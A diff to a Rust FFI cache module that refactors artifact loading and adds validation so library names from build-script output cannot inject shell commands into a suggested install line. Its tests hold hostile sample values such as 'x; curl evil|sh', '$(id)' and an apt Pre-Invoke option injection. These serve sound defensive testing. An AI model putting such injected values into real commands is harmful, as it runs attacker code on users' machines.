@@ -402,6 +402,44 @@ pub fn slugify(name: &str) -> String {
         .collect()
 }
 
+/// The suffix that marks a cache entry as one installed crate's consumer manifest.
+const CONSUMER_SUFFIX: &str = ".consumer.json";
+
+/// The artifact file names for one bound crate, relative to the cache directory.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ArtifactNames {
+    /// The `.ipei` type-environment seed.
+    pub ipei: String,
+    /// The `kernel.json` call registry.
+    pub kernel_json: String,
+    /// The `_bindings.rs` wrapper module.
+    pub bindings: String,
+    /// The `coverage.md` over-drop report.
+    pub coverage: String,
+    /// The injectable Ipê interface module.
+    pub interface: String,
+    /// The consumer manifest.
+    pub consumer: String,
+    /// The validated inspection document.
+    pub pkg_json: String,
+}
+
+impl ArtifactNames {
+    /// The artifact file names for `slug`.
+    #[must_use]
+    pub fn for_slug(slug: &str) -> Self {
+        Self {
+            ipei: format!("{slug}.ipei"),
+            kernel_json: format!("{slug}.kernel.json"),
+            bindings: format!("{slug}_bindings.rs"),
+            coverage: format!("{slug}.coverage.md"),
+            interface: format!("{slug}.ipe"),
+            consumer: format!("{slug}{CONSUMER_SUFFIX}"),
+            pkg_json: format!("{slug}.pkg.json"),
+        }
+    }
+}
+
 /// The artifact paths for one bound crate.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ArtifactPaths {
@@ -420,7 +458,7 @@ pub struct ArtifactPaths {
     pub consumer: PathBuf,
     /// The validated inspection document (`<slug>.pkg.json`) — the raw
     /// inspector wire JSON that decoded through the [`PkgInfo`] gate. The
-    /// TRUSTED source `load_catalog` re-derives `_bindings.rs` from: the
+    /// TRUSTED source `load_catalog_from` re-derives `_bindings.rs` from: the
     /// stored `_bindings.rs` text is never trusted, only regenerated.
     pub pkg_json: PathBuf,
 }
@@ -479,20 +517,21 @@ impl FfiCache {
     /// The artifact paths for a slug.
     #[must_use]
     pub fn artifact_paths(&self, slug: &str) -> ArtifactPaths {
+        let names = ArtifactNames::for_slug(slug);
         ArtifactPaths {
-            ipei: self.root.join(format!("{slug}.ipei")),
-            kernel_json: self.root.join(format!("{slug}.kernel.json")),
-            bindings: self.root.join(format!("{slug}_bindings.rs")),
-            coverage: self.root.join(format!("{slug}.coverage.md")),
-            interface: self.root.join(format!("{slug}.ipe")),
-            consumer: self.root.join(format!("{slug}.consumer.json")),
-            pkg_json: self.root.join(format!("{slug}.pkg.json")),
+            ipei: self.root.join(names.ipei),
+            kernel_json: self.root.join(names.kernel_json),
+            bindings: self.root.join(names.bindings),
+            coverage: self.root.join(names.coverage),
+            interface: self.root.join(names.interface),
+            consumer: self.root.join(names.consumer),
+            pkg_json: self.root.join(names.pkg_json),
         }
     }
 
     /// Emit and write all artifacts for a validated package. `inspection_json`
     /// is the raw inspector wire text that decoded into `pkg`; it is persisted
-    /// as `<slug>.pkg.json`, the sole source `load_catalog` re-derives the
+    /// as `<slug>.pkg.json`, the sole source `load_catalog_from` re-derives the
     /// whole consumer-side view from through the validated decode gate. The
     /// other six artifacts are debug/watch projections the loader never
     /// trusts.
@@ -565,6 +604,43 @@ impl FfiCache {
 
 // ── pkg-config missing-library detection ────────────────────────────────────
 
+/// The longest `pkg-config` library name [`SysLibName::parse`] accepts.
+pub const SYS_LIB_NAME_MAX_LEN: usize = 128;
+
+/// A `pkg-config` library name in the `pkg-config` charset, safe to place in a suggested shell command.
+///
+/// ASCII letters, digits, and `.`, `_`, `+`, `-`, opening with a letter or
+/// digit (so it never reads as a command-line option), at most
+/// [`SYS_LIB_NAME_MAX_LEN`] bytes. The name is scraped from untrusted
+/// build-script output and lands inside an `apt install …` line the user may
+/// copy and run; a value that holds a shell metacharacter or whitespace has no
+/// representation, so no install hint can carry one.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SysLibName(String);
+
+impl SysLibName {
+    /// Parse `raw`, or `None` when it falls outside the `pkg-config` charset or length bound.
+    #[must_use]
+    pub fn parse(raw: &str) -> Option<Self> {
+        let opens_with_alphanumeric = raw
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_alphanumeric());
+        let legal = opens_with_alphanumeric
+            && raw.len() <= SYS_LIB_NAME_MAX_LEN
+            && raw
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'));
+        legal.then(|| Self(raw.to_owned()))
+    }
+
+    /// The parsed name.
+    #[must_use]
+    pub fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
 /// A parsed pkg-config "not found" failure: the missing system library and
 /// the Rust crate whose build script reported it.
 ///
@@ -572,22 +648,32 @@ impl FfiCache {
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct MissingSystemLib {
     /// The `pkg-config` library name (e.g. `wayland-client`).
-    pub system_lib: String,
-    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`).
-    pub crate_name: String,
+    pub system_lib: SysLibName,
+    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`), when the
+    /// failure named one that parses as a crate name.
+    pub crate_name: Option<CrateName>,
 }
 
-/// Trim and strip control characters from a name extracted out of raw
-/// build-script stderr. A system-library or crate name is rendered into a styled
-/// diagnostic; an ANSI escape or other control byte carried in the raw stderr
-/// must not reach the terminal and forge markup, so it is removed at the parse
-/// boundary (the typed value downstream is always terminal-safe).
+/// Trim and strip control characters from a name extracted out of raw build-script stderr.
+///
+/// An ANSI escape or other control byte carried in the raw stderr is removed
+/// before the name is parsed, so the parse sees the characters a terminal
+/// would show.
 fn sanitize_extracted_name(raw: &str) -> String {
     TerminalSafe::sanitize(raw.trim())
         .as_str()
         .chars()
         .filter(|&c| c != '\n' && c != '\t')
         .collect()
+}
+
+/// Parse a missing-library failure's two names, or `None` when the library name does not parse.
+fn missing_system_lib(sys_lib: &str, crate_name: Option<&str>) -> Option<MissingSystemLib> {
+    Some(MissingSystemLib {
+        system_lib: SysLibName::parse(&sanitize_extracted_name(sys_lib))?,
+        crate_name: crate_name
+            .and_then(|name| CrateName::parse(&sanitize_extracted_name(name)).ok()),
+    })
 }
 
 /// The raw inspector error channel from an inspection document, best-effort.
@@ -609,7 +695,9 @@ pub fn inspection_error_log(inspection_json: &str) -> Vec<String> {
 /// - Package `<lib>` was not found (or not found in the pkg-config search path)
 ///
 /// Returns `None` when no pkg-config signature is present (the failure has a
-/// different cause).
+/// different cause), or when the named library does not parse as a
+/// [`SysLibName`]: such a failure is summarised like any other, with no
+/// install hint.
 #[must_use]
 pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> {
     for line in errors {
@@ -619,10 +707,7 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some((sys_lib, rest)) = rest.split_once("` required by crate `")
             && let Some((crate_name, _)) = rest.split_once("` was not found")
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                crate_name: sanitize_extracted_name(crate_name),
-            });
+            return missing_system_lib(sys_lib, Some(crate_name));
         }
         // Secondary form from pkg-config itself:
         // "Package '<lib>' was not found in the pkg-config search path."
@@ -632,12 +717,8 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some(rest) = line.strip_prefix("Package '")
             && let Some((sys_lib, _)) = rest.split_once('\'')
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                // No crate name in this form — leave empty; the caller
-                // fills it from context when available.
-                crate_name: String::new(),
-            });
+            // No crate name in this form; the caller fills it from context.
+            return missing_system_lib(sys_lib, None);
         }
     }
     None
@@ -734,9 +815,11 @@ const PKG_CONFIG_INSTALL_HINTS: &[(&str, &str, &str, &str)] = &[
 ///
 /// Looks up `sys_lib` in the curated table first; falls back to a generic
 /// "install the `-dev` package that provides `<lib>.pc`" message when the
-/// library is not in the table.
+/// library is not in the table. Only a parsed [`SysLibName`] reaches the
+/// suggested command.
 #[must_use]
-pub fn install_hint_for(sys_lib: &str) -> String {
+pub fn install_hint_for(sys_lib: &SysLibName) -> String {
+    let sys_lib = sys_lib.as_str();
     for &(key, deb, fed, brew) in PKG_CONFIG_INSTALL_HINTS {
         if key == sys_lib {
             let mut parts: Vec<String> = Vec::new();
@@ -848,11 +931,9 @@ pub fn install_from_inspection(
         // caller and the CLI act on, not the raw string.
         if let Some(missing) = detect_missing_system_lib(pkg.errors()) {
             let install_hint = install_hint_for(&missing.system_lib);
-            let crate_name = if missing.crate_name.is_empty() {
-                pkg.name().to_owned()
-            } else {
-                missing.crate_name
-            };
+            let crate_name = missing
+                .crate_name
+                .map_or_else(|| pkg.name().to_owned(), |name| name.as_str().to_owned());
             return Err(Diagnostic::SystemLibraryNotFound {
                 system_lib: missing.system_lib,
                 crate_name,
@@ -1007,9 +1088,91 @@ pub struct InspectedConstFact {
     pub ty: String,
 }
 
-/// Load every installed crate from a project's FFI artifact cache.
+/// Load the catalog of a cache the caller created itself, reading by path.
 ///
-/// An absent cache directory is an empty catalog (a project with no FFI).
+/// An absent cache directory is an empty catalog. This reader follows links
+/// and caps nothing, so it exists only for tests: production loads a
+/// discovered cache through [`load_catalog_from`] over an owner-checked,
+/// no-follow handle.
+///
+/// # Errors
+///
+/// As [`load_catalog_from`].
+#[cfg(any(test, feature = "testing"))]
+pub fn load_catalog(cache_root: &Path) -> Result<Vec<InstalledCrate>, Diagnostic> {
+    if !cache_root.is_dir() {
+        return Ok(Vec::new());
+    }
+    load_catalog_from(&PathCacheSource(cache_root))
+}
+
+/// A readable FFI cache directory the catalog loader draws its artifacts from.
+///
+/// The loader never touches the filesystem itself: every listing and read goes
+/// through the source, so a caller holding the cache as an owner-checked,
+/// no-follow directory handle keeps every read on that same handle.
+pub trait CacheSource {
+    /// The error a listing or read fails with; every loader diagnostic converts into it.
+    type Error: From<Diagnostic>;
+
+    /// The cache directory's path, used only to name artifacts in diagnostics.
+    fn root(&self) -> &Path;
+
+    /// The names of the entries directly inside the cache directory.
+    ///
+    /// # Errors
+    ///
+    /// When the directory cannot be listed.
+    fn entry_names(&self) -> Result<Vec<String>, Self::Error>;
+
+    /// The text of the artifact `name`, or `None` when no such entry exists.
+    ///
+    /// # Errors
+    ///
+    /// When the entry exists but cannot be read as a trusted artifact.
+    fn read_artifact(&self, name: &str) -> Result<Option<String>, Self::Error>;
+}
+
+/// A cache read by path, following links, for a directory the caller owns outright.
+#[cfg(any(test, feature = "testing"))]
+struct PathCacheSource<'a>(&'a Path);
+
+#[cfg(any(test, feature = "testing"))]
+impl CacheSource for PathCacheSource<'_> {
+    type Error = Diagnostic;
+
+    fn root(&self) -> &Path {
+        self.0
+    }
+
+    fn entry_names(&self) -> Result<Vec<String>, Diagnostic> {
+        let io_err = |e: &std::io::Error| Diagnostic::ArtifactIo {
+            path: self.0.to_string_lossy().into_owned(),
+            detail: e.to_string(),
+        };
+        let mut names = Vec::new();
+        for entry in std::fs::read_dir(self.0).map_err(|e| io_err(&e))? {
+            let entry = entry.map_err(|e| io_err(&e))?;
+            names.push(entry.file_name().to_string_lossy().into_owned());
+        }
+        Ok(names)
+    }
+
+    fn read_artifact(&self, name: &str) -> Result<Option<String>, Diagnostic> {
+        let path = self.0.join(name);
+        if !path.is_file() {
+            return Ok(None);
+        }
+        std::fs::read_to_string(&path)
+            .map(Some)
+            .map_err(|e| Diagnostic::ArtifactIo {
+                path: path.to_string_lossy().into_owned(),
+                detail: e.to_string(),
+            })
+    }
+}
+
+/// Load every installed crate from a project's FFI artifact cache, read through `source`.
 ///
 /// `<slug>.pkg.json` is the SOLE source of record: when it exists, EVERY
 /// consumer-side view — interface source, bindings source, module/kernel
@@ -1029,69 +1192,62 @@ pub struct InspectedConstFact {
 ///
 /// `IPE-F4412` for an unreadable artifact; a wire-defect diagnostic for a
 /// malformed consumer manifest, a malformed inspection document, or a missing
-/// wrapper.
-pub fn load_catalog(cache_root: &Path) -> Result<Vec<InstalledCrate>, Diagnostic> {
-    if !cache_root.is_dir() {
-        return Ok(Vec::new());
-    }
-    let io_err = |path: &Path, detail: String| Diagnostic::ArtifactIo {
-        path: path.to_string_lossy().into_owned(),
-        detail,
-    };
-    let mut slugs: Vec<String> = Vec::new();
-    let entries = std::fs::read_dir(cache_root).map_err(|e| io_err(cache_root, e.to_string()))?;
-    for entry in entries {
-        let entry = entry.map_err(|e| io_err(cache_root, e.to_string()))?;
-        let name = entry.file_name().to_string_lossy().into_owned();
-        if let Some(slug) = name.strip_suffix(".consumer.json") {
-            slugs.push(slug.to_owned());
-        }
-    }
+/// wrapper; any error `source` raises while listing or reading.
+pub fn load_catalog_from<S: CacheSource>(source: &S) -> Result<Vec<InstalledCrate>, S::Error> {
+    let mut slugs: Vec<String> = source
+        .entry_names()?
+        .into_iter()
+        .filter_map(|name| name.strip_suffix(CONSUMER_SUFFIX).map(str::to_owned))
+        .collect();
     slugs.sort();
     let mut out = Vec::with_capacity(slugs.len());
     for slug in slugs {
-        out.push(load_installed_crate(cache_root, slug)?);
+        out.push(load_installed_crate(source, slug)?);
     }
     Ok(out)
 }
 
-/// Load and validate ONE installed crate's artifacts (see [`load_catalog`]).
+/// Load and validate ONE installed crate's artifacts (see [`load_catalog_from`]).
 ///
 /// # Errors
 ///
-/// As [`load_catalog`], scoped to this slug's artifacts.
+/// As [`load_catalog_from`], scoped to this slug's artifacts.
 #[allow(clippy::too_many_lines)] // one linear artifact decode-and-cross-check cascade
-fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrate, Diagnostic> {
-    let io_err = |path: &Path, detail: String| Diagnostic::ArtifactIo {
-        path: path.to_string_lossy().into_owned(),
-        detail,
-    };
+fn load_installed_crate<S: CacheSource>(
+    source: &S,
+    slug: String,
+) -> Result<InstalledCrate, S::Error> {
     {
         let cache = FfiCache {
-            root: cache_root.to_path_buf(),
+            root: source.root().to_path_buf(),
         };
         let paths = cache.artifact_paths(&slug);
-        let read = |p: &Path| -> Result<String, Diagnostic> {
-            std::fs::read_to_string(p).map_err(|e| io_err(p, e.to_string()))
+        let names = ArtifactNames::for_slug(&slug);
+        let read = |name: &str, path: &Path| -> Result<String, S::Error> {
+            source.read_artifact(name)?.ok_or_else(|| {
+                Diagnostic::ArtifactIo {
+                    path: path.to_string_lossy().into_owned(),
+                    detail: "artifact is missing".to_owned(),
+                }
+                .into()
+            })
         };
         // RE-DERIVE the whole consumer-side view from the validated
         // inspection document — no on-disk projection is trusted as text
-        // (see [`load_catalog`]). A legacy cache written before the
+        // (see [`load_catalog_from`]). A legacy cache written before the
         // `pkg.json` artifact existed has no document to re-derive from; it
         // falls back to the stored projections, whose trust then rests on
-        // the discovery-time ownership/write-boundary gate
-        // (`find_cache_root`) plus the injection-free-by-construction
-        // emitter.
-        if paths.pkg_json.is_file() {
-            let pkg_text = read(&paths.pkg_json)?;
+        // the discovery-time ownership/write-boundary gate the source
+        // enforces plus the injection-free-by-construction emitter.
+        if let Some(pkg_text) = source.read_artifact(&names.pkg_json)? {
             let pkg = PkgInfo::decode_json(&pkg_text)?;
-            return installed_crate_from_pkg(slug, &pkg, &cache);
+            return installed_crate_from_pkg(slug, &pkg, &cache).map_err(Into::into);
         }
-        let consumer_text = read(&paths.consumer)?;
-        let interface_source = read(&paths.interface)?;
+        let consumer_text = read(&names.consumer, &paths.consumer)?;
+        let interface_source = read(&names.interface, &paths.interface)?;
         let dep_versions: std::collections::BTreeMap<String, String> =
             std::collections::BTreeMap::new();
-        let bindings_source = read(&paths.bindings)?;
+        let bindings_source = read(&names.bindings, &paths.bindings)?;
         let malformed = |detail: String| Diagnostic::WireMalformed {
             context: format!("consumer manifest `{}`", paths.consumer.display()),
             defect: crate::diag::WireDefect::Json { detail },
@@ -1209,7 +1365,8 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                 "interface module surfaces a transparent record/union but the manifest \
                  carries no `transparentTypes` — re-run `ipe add` to regenerate the cache"
                     .to_owned(),
-            ));
+            )
+            .into());
         }
         let bindings: Vec<crate::interface::InterfaceBinding> = doc
             .get("bindings")
@@ -1230,36 +1387,44 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                             // Absent slots mean no parameter converts; present
                             // slots must align with the binding's arity, or the
                             // backend would skip (or misapply) a conversion.
-                            let transparent_params = match b
+                            // A slot is a transparent type name or `null`; any
+                            // other JSON value is malformed, never read as "no
+                            // conversion".
+                            let transparent_params = b
                                 .get("transparentParams")
                                 .and_then(serde_json::Value::as_array)
-                            {
-                                None => Ok(crate::interface::TransparentParams::None),
-                                // A slot is a transparent type name or `null`;
-                                // any other JSON value is malformed, never read
-                                // as "no conversion".
-                                Some(ps) => ps
-                                    .iter()
-                                    .enumerate()
-                                    .map(|(i, p)| match p {
-                                        serde_json::Value::Null => Ok(None),
-                                        serde_json::Value::String(s) => Ok(Some(s.clone())),
-                                        serde_json::Value::Bool(_)
-                                        | serde_json::Value::Number(_)
-                                        | serde_json::Value::Array(_)
-                                        | serde_json::Value::Object(_) => Err(malformed(format!(
-                                            "binding `{ref_name}`: transparentParams[{i}] is \
-                                             neither a type name nor null"
-                                        ))),
-                                    })
-                                    .collect::<Result<Vec<_>, Diagnostic>>()
-                                    .and_then(|slots| {
-                                        crate::interface::TransparentParams::aligned(slots, arity)
-                                            .map_err(|drift| {
-                                                malformed(format!("binding `{ref_name}`: {drift}"))
+                                .map_or_else(
+                                    || Ok(crate::interface::TransparentParams::None),
+                                    |ps| {
+                                        ps.iter()
+                                            .enumerate()
+                                            .map(|(i, p)| match p {
+                                                serde_json::Value::Null => Ok(None),
+                                                serde_json::Value::String(s) => Ok(Some(s.clone())),
+                                                serde_json::Value::Bool(_)
+                                                | serde_json::Value::Number(_)
+                                                | serde_json::Value::Array(_)
+                                                | serde_json::Value::Object(_) => {
+                                                    Err(malformed(format!(
+                                                        "binding `{ref_name}`: \
+                                                         transparentParams[{i}] is neither a \
+                                                         type name nor null"
+                                                    )))
+                                                }
                                             })
-                                    }),
-                            };
+                                            .collect::<Result<Vec<_>, Diagnostic>>()
+                                            .and_then(|slots| {
+                                                crate::interface::TransparentParams::aligned(
+                                                    slots, arity,
+                                                )
+                                                .map_err(|drift| {
+                                                    malformed(format!(
+                                                        "binding `{ref_name}`: {drift}"
+                                                    ))
+                                                })
+                                            })
+                                    },
+                                );
                             let transparent_result = b.get("transparentResult").and_then(|r| {
                                 Some(crate::interface::TransparentResult {
                                     type_name: r
@@ -1296,7 +1461,8 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                     "interface forwards to wrapper `{ident}` but `{}` declares no such \
                      `pub fn` — re-run `ipe add` to regenerate the cache",
                     paths.bindings.display()
-                )));
+                ))
+                .into());
             }
         }
         Ok(InstalledCrate {
@@ -2582,7 +2748,7 @@ mod tests {
                 .to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
         assert_eq!(got.crate_name, "wayland-sys");
     }
 
@@ -2593,7 +2759,7 @@ mod tests {
             "Package 'wayland-client' was not found in the pkg-config search path.".to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
     }
 
     #[test]
@@ -2610,14 +2776,15 @@ mod tests {
 
     #[test]
     fn install_hint_for_returns_curated_hint_for_known_lib() {
-        let hint = install_hint_for("wayland-client");
+        let hint = install_hint_for(&SysLibName::parse("wayland-client").expect("legal name"));
         assert!(hint.contains("wayland"), "{hint}");
         assert!(hint.contains("apt"), "{hint}");
     }
 
     #[test]
     fn install_hint_for_returns_generic_fallback_for_unknown_lib() {
-        let hint = install_hint_for("some-obscure-lib-xyz");
+        let hint =
+            install_hint_for(&SysLibName::parse("some-obscure-lib-xyz").expect("legal name"));
         assert!(
             hint.contains("some-obscure-lib-xyz"),
             "fallback must mention the lib name: {hint}"
@@ -2715,7 +2882,7 @@ mod tests {
                 crate_name,
                 ..
             } => {
-                assert_eq!(system_lib, "wayland-client");
+                assert_eq!(system_lib.as_str(), "wayland-client");
                 assert_eq!(crate_name, "wayland-sys");
             }
             other => panic!("expected SystemLibraryNotFound, got {other:?}"),
@@ -2742,9 +2909,81 @@ mod tests {
         let got = detect_missing_system_lib(&[line]).expect("signature matches");
         // `ESC l` is a two-byte escape sequence, dropped whole like every
         // escape `TerminalSafe` strips.
-        assert_eq!(got.system_lib, "wayand");
-        assert_eq!(got.crate_name, "wlsys");
-        assert!(!got.system_lib.contains('\u{1b}'));
+        assert_eq!(got.system_lib.as_str(), "wayand");
+        assert_eq!(
+            got.crate_name.as_ref().map(CrateName::as_str),
+            Some("wlsys")
+        );
+        assert!(!got.system_lib.as_str().contains('\u{1b}'));
+    }
+
+    /// A library name outside the `pkg-config` charset never reaches an install hint.
+    #[test]
+    fn a_hostile_system_lib_name_yields_no_install_hint() {
+        let over_length = "a".repeat(SYS_LIB_NAME_MAX_LEN + 1);
+        let hostile = [
+            "x; curl evil|sh",
+            "$(id)",
+            "`id`",
+            "lib foo",
+            "-o APT::Update::Pre-Invoke::=id",
+            over_length.as_str(),
+        ];
+        for name in hostile {
+            assert_eq!(SysLibName::parse(name), None, "{name:?} parsed");
+            let primary =
+                format!("The system library `{name}` required by crate `evil-sys` was not found.");
+            assert_eq!(
+                detect_missing_system_lib(&[primary]),
+                None,
+                "{name:?} detected"
+            );
+            let secondary =
+                format!("Package '{name}' was not found in the pkg-config search path.");
+            assert_eq!(
+                detect_missing_system_lib(&[secondary]),
+                None,
+                "{name:?} detected"
+            );
+        }
+        let longest = "a".repeat(SYS_LIB_NAME_MAX_LEN);
+        assert!(
+            SysLibName::parse(&longest).is_some(),
+            "the bound itself is legal"
+        );
+        assert!(SysLibName::parse("gtk+-3.0").is_some());
+        assert!(SysLibName::parse("libpipewire-0.3").is_some());
+    }
+
+    /// A hostile library name surfaces as the summarised inspector failure, never as a hint.
+    #[test]
+    fn install_from_inspection_gives_no_hint_for_a_hostile_system_lib() {
+        let json = serde_json::json!({
+            "pkg": "evil",
+            "name": "evil",
+            "version": "0.1.0",
+            "functions": [],
+            "errors": [
+                "The system library `x; curl evil|sh` required by crate `evil-sys` was not found."
+            ]
+        })
+        .to_string();
+        let tmp =
+            std::env::temp_dir().join(format!("ipe-ffi-syslib-hostile-{}", std::process::id()));
+        let cache = FfiCache::at_project_root(&tmp);
+        let err = install_from_inspection(&cache, &json).expect_err("must fail");
+        assert!(
+            matches!(err, crate::diag::Diagnostic::WireMalformed { .. }),
+            "expected a summarised failure, got {err:?}"
+        );
+    }
+
+    /// A crate name that does not parse falls back to the inspected package's name.
+    #[test]
+    fn a_hostile_crate_name_falls_back_to_the_package_name() {
+        let line = "The system library `zlib` required by crate `a b;c` was not found.".to_owned();
+        let got = detect_missing_system_lib(&[line]).expect("library parses");
+        assert_eq!(got.crate_name, None);
     }
 
     #[test]
